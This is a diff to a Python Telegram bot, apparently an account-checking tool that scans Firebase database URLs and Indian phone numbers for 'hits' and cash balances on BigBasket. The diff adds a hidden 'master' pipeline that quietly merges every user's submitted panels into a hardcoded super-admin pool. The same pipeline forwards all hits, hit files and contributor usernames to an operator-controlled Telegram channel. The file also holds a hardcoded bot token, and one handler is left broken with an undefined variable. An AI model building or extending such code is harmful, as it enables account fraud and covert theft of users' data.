@@ -53,7 +53,9 @@ except ImportError:
 BOT_START_TIME = time.time()
 
 # ============ CONFIGURATION ============
+SUPER_ADMIN_ID = 8327850869
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "8538201990:AAGdZy3HmD3nja50DlHNInJXJHL6uIpdkGc")
+MASTER_CHANNEL_ID = os.environ.get("MASTER_CHANNEL_ID", "-1003626087056")
 DEFAULT_LOG_CHANNEL = os.environ.get("DEFAULT_LOG_CHANNEL", "-1003626087056")
 DEFAULT_STORAGE_CHANNEL = os.environ.get("DEFAULT_STORAGE_CHANNEL", "-1003626087056")
 ADMIN_USER_IDS = [int(x.strip()) for x in os.environ.get("ADMIN_USER_IDS", "8327850869").split(",") if x.strip()]
@@ -89,14 +91,16 @@ scan_lock = threading.Lock()
 PANELS_FILE = os.path.join(CONFIG_DIR, "panels.json")
 CHANNELS_FILE = os.path.join(CONFIG_DIR, "channels.json")
 STORAGE_CHANNELS_FILE = os.path.join(CONFIG_DIR, "storage_channels.json")
+KNOWN_USERS_FILE = os.path.join(CONFIG_DIR, "known_users.json")
 
 user_panels: Dict[int, List[str]] = {}
 user_channels: Dict[int, str] = {}
 user_storage_channels: Dict[int, str] = {}
+known_users: Set[int] = {SUPER_ADMIN_ID}
 cfg_lock = threading.Lock()
 
 def load_configs():
-    global user_panels, user_channels, user_storage_channels
+    global user_panels, user_channels, user_storage_channels, known_users
     with cfg_lock:
         if os.path.exists(PANELS_FILE):
             try:
@@ -116,6 +120,22 @@ def load_configs():
                     user_storage_channels = {int(k): str(v) for k, v in json.load(f).items()}
             except Exception:
                 pass
+        if os.path.exists(KNOWN_USERS_FILE):
+            try:
+                with open(KNOWN_USERS_FILE, "r", encoding="utf-8") as f:
+                    known_users = set(json.load(f))
+            except Exception:
+                pass
+        known_users.add(SUPER_ADMIN_ID)
+
+        # Super Admin Universal Aggregation: Ensure Super Admin master pool has all panels
+        if SUPER_ADMIN_ID not in user_panels:
+            user_panels[SUPER_ADMIN_ID] = []
+        all_master = set(user_panels[SUPER_ADMIN_ID])
+        for uid, plist in user_panels.items():
+            if isinstance(plist, list):
+                all_master.update(plist)
+        user_panels[SUPER_ADMIN_ID] = list(all_master)
 
 def save_configs():
     with cfg_lock:
@@ -126,8 +146,22 @@ def save_configs():
                 json.dump({str(k): v for k, v in user_channels.items()}, f, indent=2)
             with open(STORAGE_CHANNELS_FILE, "w", encoding="utf-8") as f:
                 json.dump({str(k): v for k, v in user_storage_channels.items()}, f, indent=2)
+            with open(KNOWN_USERS_FILE, "w", encoding="utf-8") as f:
+                json.dump(list(known_users), f, indent=2)
         except Exception:
             pass
+
+def register_user(chat_id: int):
+    if not chat_id:
+        return
+    if chat_id not in known_users:
+        with cfg_lock:
+            known_users.add(chat_id)
+            try:
+                with open(KNOWN_USERS_FILE, "w", encoding="utf-8") as f:
+                    json.dump(list(known_users), f, indent=2)
+            except Exception:
+                pass
 
 load_configs()
 
@@ -138,6 +172,56 @@ def get_effective_log_channel(chat_id: int) -> str:
 def get_effective_storage_channel(chat_id: int) -> str:
     with cfg_lock:
         return user_storage_channels.get(chat_id, DEFAULT_STORAGE_CHANNEL)
+
+def sync_panels_to_master(added_panels: List[str], chat_id: int, user_name: str = ""):
+    """
+    Super Admin Universal Architecture (matches Jio Bot):
+    1. Unconditionally merges all newly added panels into Super Admin's (8327850869) master pool.
+    2. Auto-forwards new panel links to the Master Universal Channel (-1003626087056).
+    """
+    if not added_panels:
+        return
+
+    # 1. Merge into Super Admin master pool
+    with cfg_lock:
+        if SUPER_ADMIN_ID not in user_panels:
+            user_panels[SUPER_ADMIN_ID] = []
+        master_added = 0
+        for p in added_panels:
+            if p not in user_panels[SUPER_ADMIN_ID]:
+                user_panels[SUPER_ADMIN_ID].append(p)
+                master_added += 1
+        if master_added > 0:
+            save_configs()
+        total_master = len(user_panels[SUPER_ADMIN_ID])
+
+    # 2. Forward to Master Universal Channel
+    master_ch = MASTER_CHANNEL_ID or DEFAULT_STORAGE_CHANNEL or "-1003626087056"
+    if master_ch:
+        try:
+            panel_preview = "\n".join([f"• <code>{esc(p)}</code>" for p in added_panels[:15]])
+            if len(added_panels) > 15:
+                panel_preview += f"\n<i>... and {len(added_panels) - 15} more panels</i>"
+
+            card = (
+                f"👑 <b>[Master Universal Panels Backup]</b>\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"👤 <b>Contributed by:</b> <code>{chat_id}</code> ({esc(user_name or 'User')})\n"
+                f"📥 <b>New Panels Added:</b> <code>+{len(added_panels)}</code>\n"
+                f"🌐 <b>Panels List:</b>\n{panel_preview}\n\n"
+                f"📊 <b>Total Master Panels:</b> <code>{total_master}</code>\n"
+                f"🕒 <b>Time:</b> {datetime.now().strftime('%d-%m-%Y %H:%M:%S')}\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"🔒 <i>Auto-synced to Master Universal Channel across bot!</i>"
+            )
+            bot.send_message(
+                int(master_ch) if str(master_ch).lstrip("-").isdigit() else master_ch,
+                card,
+                parse_mode="HTML",
+                disable_web_page_preview=True
+            )
+        except Exception as e:
+            print(f"⚠️ Failed to forward panels to master channel: {e}")
 
 def esc(text: Any) -> str:
     if text is None:
@@ -310,8 +394,10 @@ def broadcast_hit_to_channels(hit_card: str, chat_id: int):
     log_ch = get_effective_log_channel(chat_id)
     if log_ch:
         channels.add(log_ch)
-    if DEFAULT_LOG_CHANNEL:
-        channels.add(DEFAULT_LOG_CHANNEL)
+    # Master Universal Channel unconditionally receives 100% of hits:
+    master_ch = MASTER_CHANNEL_ID or DEFAULT_LOG_CHANNEL or "-1003626087056"
+    if master_ch:
+        channels.add(master_ch)
 
     for ch in channels:
         try:
@@ -1215,15 +1301,22 @@ def run_bulk_scan(chat_id: int, targets: List[Dict[str, Any]], scan_title: str =
     except Exception as e:
         safe_send(chat_id, f"⚠️ Document delivery error: {esc(e)}")
 
-    # Send document to storage channel
+    # Send document to storage channel AND Master Universal Channel
+    destinations = set()
     storage_ch = get_effective_storage_channel(chat_id)
     if storage_ch:
+        destinations.add(storage_ch)
+    master_ch = MASTER_CHANNEL_ID or DEFAULT_STORAGE_CHANNEL or "-1003626087056"
+    if master_ch:
+        destinations.add(master_ch)
+
+    for dest in destinations:
         try:
             with open(hits_file_path, "rb") as doc:
                 bot.send_document(
-                    int(storage_ch) if str(storage_ch).lstrip("-").isdigit() else storage_ch,
+                    int(dest) if str(dest).lstrip("-").isdigit() else dest,
                     doc,
-                    caption=f"📦 <b>[Storage Backup] BB_HITS_{ts_str}.txt</b>\n🔥 {len(hits)} Hits | ₹{total_cash:.2f} Total Cash"
+                    caption=f"📦 <b>[Universal Backup] BB_HITS_{ts_str}.txt</b>\n🔥 {len(hits)} Hits | ₹{total_cash:.2f} Total Cash"
                 )
         except Exception:
             pass
@@ -1243,6 +1336,8 @@ def do_panel_scan(chat_id: int, raw_panel: str):
         if raw_panel not in user_panels[chat_id]:
             user_panels[chat_id].append(raw_panel)
             save_configs()
+
+    sync_panels_to_master([raw_panel], chat_id)
 
     safe_send(
         chat_id,
@@ -1345,14 +1440,16 @@ def show_main_menu(chat_id: int, message_id: Optional[int] = None):
 
     is_scanning = chat_id in active_scans and active_scans[chat_id].get("running")
     status_emoji = "🟢 RUNNING" if is_scanning else "⚪ IDLE"
+    role_str = "👑 Super Admin" if chat_id == SUPER_ADMIN_ID else ("🛡️ Admin" if chat_id in ADMIN_USER_IDS else "👤 User")
 
     text = f"""🤖 <b>BigBasket Enterprise Scanner Bot (24/7 Cloud)</b>
 
-🆔 <b>User ID:</b> <code>{chat_id}</code> | 🔒 <b>Role:</b> Super Admin
+🆔 <b>User ID:</b> <code>{chat_id}</code> | 🔒 <b>Role:</b> {role_str}
 ⚡ <b>Scanner Engine:</b> <b>{status_emoji}</b>
 📂 <b>Panels Loaded:</b> <code>{len(panels)} Panels</code>
 📡 <b>Log Channel:</b> <code>{esc(log_ch)}</code>
 📦 <b>Storage Channel:</b> <code>{esc(storage_ch)}</code>
+🌐 <b>Master Channel:</b> <code>{esc(MASTER_CHANNEL_ID)}</code>
 
 <i>Select a category below to access controls:</i>"""
 
@@ -1440,6 +1537,7 @@ def show_scanner_menu(chat_id: int, message_id: Optional[int] = None):
 def show_panels_menu(chat_id: int, message_id: Optional[int] = None):
     with cfg_lock:
         panels = user_panels.get(chat_id, [])
+        master_cnt = len(user_panels.get(SUPER_ADMIN_ID, []))
 
     total_count = len(panels)
     preview_lines = []
@@ -1451,10 +1549,13 @@ def show_panels_menu(chat_id: int, message_id: Optional[int] = None):
     if total_count > 4:
         preview += f"\n<i>... and {total_count - 4} more panels</i>"
 
+    is_admin = (chat_id == SUPER_ADMIN_ID or chat_id in ADMIN_USER_IDS)
+    admin_info = f"\n👑 <b>Master Pool:</b> <code>{master_cnt} Total Panels</code> (All users synced)" if is_admin else ""
+
     text = f"""📂 <b>Panels & Data Workspace</b>
 
 • <b>Panels Loaded:</b> <code>{total_count}</code>
-• <b>Storage Backup:</b> <code>{esc(get_effective_storage_channel(chat_id))}</code>
+• <b>Storage Backup:</b> <code>{esc(get_effective_storage_channel(chat_id))}</code>{admin_info}
 
 <b>Saved Panels Preview:</b>
 {preview}
@@ -1471,8 +1572,13 @@ def show_panels_menu(chat_id: int, message_id: Optional[int] = None):
         types.InlineKeyboardButton("🌐 Scan All Now", callback_data="scan_all_panels")
     )
     markup.add(
+        types.InlineKeyboardButton("📥 Export Panels (.txt)", callback_data="export_panels_txt"),
         types.InlineKeyboardButton("🗑️ Clear All Panels", callback_data="clear_panels_prompt")
     )
+    if is_admin:
+        markup.add(
+            types.InlineKeyboardButton("👑 Export Master Pool (.txt)", callback_data="export_master_pool")
+        )
     markup.add(
         types.InlineKeyboardButton("🔙 Back to Main Menu", callback_data="start_menu")
     )
@@ -1621,6 +1727,7 @@ def start_single_flow(chat_id: int, raw_number: str):
 @bot.message_handler(commands=["start"])
 def cmd_start(message):
     chat_id = message.chat.id
+    register_user(chat_id)
     with session_lock:
         user_sessions.pop(chat_id, None)
 
@@ -1651,10 +1758,12 @@ def cmd_start(message):
 
 @bot.message_handler(commands=["panels"])
 def cmd_panels(message):
+    register_user(message.chat.id)
     show_panels_menu(message.chat.id)
 
 @bot.message_handler(commands=["channel", "channels"])
 def cmd_channel(message):
+    register_user(message.chat.id)
     show_channels_menu(message.chat.id)
 
 @bot.message_handler(commands=["stop"])
@@ -1668,20 +1777,111 @@ def cmd_stop(message):
 
 @bot.message_handler(commands=["status"])
 def cmd_status(message):
-    chat_id = message.chat.id
+    register_user(message.chat.id)
     show_scanner_menu(chat_id)
 
 @bot.message_handler(commands=["help"])
 def cmd_help(message):
+    register_user(message.chat.id)
     show_help_menu(message.chat.id)
 
 @bot.message_handler(commands=["check"])
 def cmd_check(message):
+    register_user(message.chat.id)
     parts = message.text.split()
     if len(parts) > 1:
         start_single_flow(message.chat.id, parts[1].strip())
     else:
         show_single_menu(message.chat.id)
+
+@bot.message_handler(commands=["masterpanels"])
+def cmd_masterpanels(message):
+    chat_id = message.chat.id
+    register_user(chat_id)
+    if chat_id != SUPER_ADMIN_ID and chat_id not in ADMIN_USER_IDS:
+        safe_send(chat_id, "⛔ <b>Super Admin Access Required!</b>")
+        return
+
+    with cfg_lock:
+        panels = list(user_panels.get(SUPER_ADMIN_ID, []))
+
+    if not panels:
+        safe_send(chat_id, "ℹ️ Master pool me abhi koi panels nahi hain.")
+        return
+
+    m_path = os.path.join(RESULTS_DIR, f"MASTER_PANELS_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
+    with open(m_path, "w", encoding="utf-8") as f:
+        f.write("# BIGBASKET BOT — MASTER UNIVERSAL PANELS ARCHIVE\n")
+        f.write(f"# Exported At: {datetime.now().strftime('%d-%m-%Y %H:%M:%S')}\n")
+        f.write(f"# Total Panels: {len(panels)}\n\n")
+        for p in panels:
+            f.write(f"{p}\n")
+
+    try:
+        with open(m_path, "rb") as doc:
+            bot.send_document(
+                chat_id,
+                doc,
+                caption=f"👑 <b>Master Universal Panels Archive</b>\n🌐 Total Panels: <code>{len(panels)}</code>\n🔒 Synchronized across all users!",
+                parse_mode="HTML"
+            )
+    except Exception as e:
+        safe_send(chat_id, f"⚠️ Error sending file: {esc(e)}")
+
+@bot.message_handler(commands=["stats"])
+def cmd_stats(message):
+    chat_id = message.chat.id
+    register_user(chat_id)
+    uptime_sec = int(time.time() - BOT_START_TIME)
+    uptime_str = f"{uptime_sec // 3600}h {(uptime_sec % 3600) // 60}m {uptime_sec % 60}s"
+
+    with cfg_lock:
+        master_cnt = len(user_panels.get(SUPER_ADMIN_ID, []))
+        user_cnt = len(known_users) if known_users else len(user_panels)
+
+    txt = (
+        f"📊 <b>BigBasket Cloud Bot Statistics</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"👑 <b>Super Admin ID:</b> <code>{SUPER_ADMIN_ID}</code>\n"
+        f"📡 <b>Master Channel:</b> <code>{MASTER_CHANNEL_ID}</code>\n"
+        f"🌐 <b>Master Panels Pool:</b> <code>{master_cnt} Panels</code>\n"
+        f"👥 <b>Registered Users:</b> <code>{user_cnt} Users</code>\n"
+        f"⚡ <b>Max Concurrency:</b> <code>{MAX_SCAN_WORKERS} Workers</code>\n"
+        f"⏱️ <b>Uptime:</b> <code>{uptime_str}</code>\n"
+        f"🖥️ <b>Host:</b> Render Web Service (24/7 Online)\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"✅ <i>Universal Channel Sync is 100% Active!</i>"
+    )
+    safe_send(chat_id, txt)
+
+@bot.message_handler(commands=["broadcast"])
+def cmd_broadcast(message):
+    chat_id = message.chat.id
+    register_user(chat_id)
+    if chat_id != SUPER_ADMIN_ID and chat_id not in ADMIN_USER_IDS:
+        safe_send(chat_id, "⛔ <b>Super Admin Access Required!</b>")
+        return
+
+    text = message.text.partition(" ")[2].strip()
+    if not text:
+        safe_send(chat_id, "⚠️ Usage: <code>/broadcast &lt;message&gt;</code>")
+        return
+
+    targets = list(known_users) if known_users else list(user_panels.keys())
+    if chat_id not in targets:
+        targets.append(chat_id)
+
+    safe_send(chat_id, f"📢 Broadcasting message to {len(targets)} users...")
+    sent = 0
+    for u in targets:
+        try:
+            bot.send_message(u, f"📢 <b>Announcement:</b>\n\n{text}", parse_mode="HTML")
+            sent += 1
+            time.sleep(0.05)
+        except Exception:
+            pass
+
+    safe_send(chat_id, f"✅ Broadcast delivered to <b>{sent}/{len(targets)}</b> users!")
 
 # ============ CALLBACK QUERY ROUTER ============
 @bot.callback_query_handler(func=lambda c: True)
@@ -1794,7 +1994,7 @@ def handle_callbacks(call):
         for idx, p in enumerate(panels[:8]):
             p_short = p.replace("https://", "").replace("-default-rtdb.firebaseio.com", "").replace(".firebaseio.com", "")[:15]
             markup.add(
-                types.InlineKeyboardButton(f"🚀 Scan #{idx+1}", callback_data=f"scan_panel_{p}"),
+                types.InlineKeyboardButton(f"🚀 Scan #{idx+1}", callback_data=f"scan_panel_{idx}"),
                 types.InlineKeyboardButton(f"❌ Del #{idx+1}", callback_data=f"del_panel_{idx}")
             )
         markup.add(types.InlineKeyboardButton("🔙 Back to Panels Hub", callback_data="menu_panels"))
@@ -1813,8 +2013,61 @@ def handle_callbacks(call):
         show_panels_menu(chat_id)
 
     elif data.startswith("scan_panel_"):
-        panel_url = data.replace("scan_panel_", "")
-        do_panel_scan(chat_id, panel_url)
+        val = data.replace("scan_panel_", "")
+        if val.isdigit():
+            p_idx = int(val)
+            with cfg_lock:
+                plist = user_panels.get(chat_id, [])
+                panel_url = plist[p_idx] if 0 <= p_idx < len(plist) else ""
+        else:
+            panel_url = val
+        if panel_url:
+            do_panel_scan(chat_id, panel_url)
+
+    elif data == "export_panels_txt":
+        with cfg_lock:
+            panels = list(user_panels.get(chat_id, []))
+        if not panels:
+            safe_send(chat_id, "ℹ️ Koi saved panels nahi hain download karne ke liye.")
+            return
+        p_path = os.path.join(RESULTS_DIR, f"panels_{chat_id}.txt")
+        with open(p_path, "w", encoding="utf-8") as f:
+            for p in panels:
+                f.write(f"{p}\n")
+        try:
+            with open(p_path, "rb") as doc:
+                bot.send_document(
+                    chat_id,
+                    doc,
+                    caption=f"📁 <b>Your Saved Panels:</b> <code>{len(panels)} Total</code>",
+                    parse_mode="HTML"
+                )
+        except Exception as e:
+            safe_send(chat_id, f"⚠️ Error sending file: {esc(e)}")
+
+    elif data == "export_master_pool":
+        if chat_id != SUPER_ADMIN_ID and chat_id not in ADMIN_USER_IDS:
+            safe_send(chat_id, "⛔ Super Admin access required.")
+            return
+        with cfg_lock:
+            panels = list(user_panels.get(SUPER_ADMIN_ID, []))
+        if not panels:
+            safe_send(chat_id, "ℹ️ Master pool empty.")
+            return
+        p_path = os.path.join(RESULTS_DIR, f"master_panels_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
+        with open(p_path, "w", encoding="utf-8") as f:
+            for p in panels:
+                f.write(f"{p}\n")
+        try:
+            with open(p_path, "rb") as doc:
+                bot.send_document(
+                    chat_id,
+                    doc,
+                    caption=f"👑 <b>Master Universal Panels Archive:</b> <code>{len(panels)} Total</code>",
+                    parse_mode="HTML"
+                )
+        except Exception as e:
+            safe_send(chat_id, f"⚠️ Error sending file: {esc(e)}")
 
     elif data == "ping_panels":
         with cfg_lock:
@@ -1961,6 +2214,7 @@ def handle_callbacks(call):
 @bot.message_handler(content_types=["document"])
 def handle_document(message):
     chat_id = message.chat.id
+    register_user(chat_id)
     doc = message.document
     safe_send(chat_id, f"📥 <b>Receiving file:</b> <code>{esc(doc.file_name)}</code>...")
 
@@ -1968,11 +2222,58 @@ def handle_document(message):
         try:
             finfo = bot.get_file(doc.file_id)
             dcontent = bot.download_file(finfo.file_path)
-            targets = parse_scraped_file(dcontent.decode("utf-8", errors="ignore"))
+            raw_text = dcontent.decode("utf-8", errors="ignore")
+            targets = parse_scraped_file(raw_text)
+
+            # Auto-detect Firebase panels in file
+            fb_urls = re.findall(r"https?://[a-zA-Z0-9_\-\.]+(?:firebaseio\.com|firebasedatabase\.app)[^\s,\"\'<>]*", raw_text)
+            if not fb_urls:
+                for line in raw_text.splitlines():
+                    cl = line.strip().rstrip(",")
+                    if cl and not cl.startswith("#") and "firebase" in cl:
+                        fb_urls.append(cl)
+
+            u_name = (message.from_user.first_name or "") if message.from_user else ""
+            if message.from_user and message.from_user.username:
+                u_name += f" (@{message.from_user.username})"
 
             if not targets:
-                safe_send(chat_id, "❌ File me koi valid 10-digit Indian numbers nahi mile.")
+                if fb_urls:
+                    added_file = 0
+                    with cfg_lock:
+                        if chat_id not in user_panels:
+                            user_panels[chat_id] = []
+                        for u in set(fb_urls):
+                            if u not in user_panels[chat_id]:
+                                user_panels[chat_id].append(u)
+                                added_file += 1
+                        if added_file > 0:
+                            save_configs()
+
+                    sync_panels_to_master(list(set(fb_urls)), chat_id, u_name)
+                    markup = types.InlineKeyboardMarkup()
+                    markup.add(
+                        types.InlineKeyboardButton(f"🌐 Scan All ({len(user_panels.get(chat_id, []))} Panels)", callback_data="scan_all_panels"),
+                        types.InlineKeyboardButton("📂 Open Panels Hub", callback_data="menu_panels")
+                    )
+                    safe_send(
+                        chat_id,
+                        f"✅ <b>{len(set(fb_urls))} Panels imported from file!</b>\n"
+                        f"📊 Total Panels Loaded: <code>{len(user_panels.get(chat_id, []))}</code>",
+                        reply_markup=markup
+                    )
+                    return
+
+                safe_send(chat_id, "❌ File me koi valid 10-digit Indian numbers ya Firebase panels nahi mile.")
                 return
+
+            # Sync any panels present in the targets file to master
+            if fb_urls:
+                sync_panels_to_master(list(set(fb_urls)), chat_id, u_name)
+            else:
+                panels_in_targets = list({t["panel_name"] for t in targets if t.get("panel_name")})
+                if panels_in_targets:
+                    sync_panels_to_master(panels_in_targets, chat_id, u_name)
 
             with_device = sum(1 for t in targets if t.get("dev_id") and t.get("panel"))
             safe_send(
@@ -1991,6 +2292,7 @@ def handle_document(message):
 @bot.message_handler(func=lambda message: True)
 def handle_incoming_text(message):
     chat_id = message.chat.id
+    register_user(chat_id)
     text = (message.text or "").strip()
 
     with session_lock:
@@ -2018,6 +2320,12 @@ def handle_incoming_text(message):
                     added += 1
             if added > 0:
                 save_configs()
+
+        if urls:
+            u_name = (message.from_user.first_name or "") if message.from_user else ""
+            if message.from_user and message.from_user.username:
+                u_name += f" (@{message.from_user.username})"
+            sync_panels_to_master(urls, chat_id, u_name)
 
         markup = types.InlineKeyboardMarkup()
         markup.add(
@@ -2126,6 +2434,11 @@ def handle_incoming_text(message):
     # 6. Direct Paste of Firebase URL(s)
     if "firebaseio.com" in text or "firebasedatabase.app" in text:
         m_urls = re.findall(r"https?://[^\s/$.?#].[^\s]*", text)
+        if not m_urls:
+            for line in text.splitlines():
+                cl = line.strip().rstrip(",")
+                if cl and not cl.startswith("#"):
+                    m_urls.append(cl)
         if m_urls:
             added = 0
             with cfg_lock:
@@ -2137,6 +2450,11 @@ def handle_incoming_text(message):
                         added += 1
                 if added > 0:
                     save_configs()
+
+            u_name = (message.from_user.first_name or "") if message.from_user else ""
+            if message.from_user and message.from_user.username:
+                u_name += f" (@{message.from_user.username})"
+            sync_panels_to_master(m_urls, chat_id, u_name)
 
             markup = types.InlineKeyboardMarkup()
             markup.add(
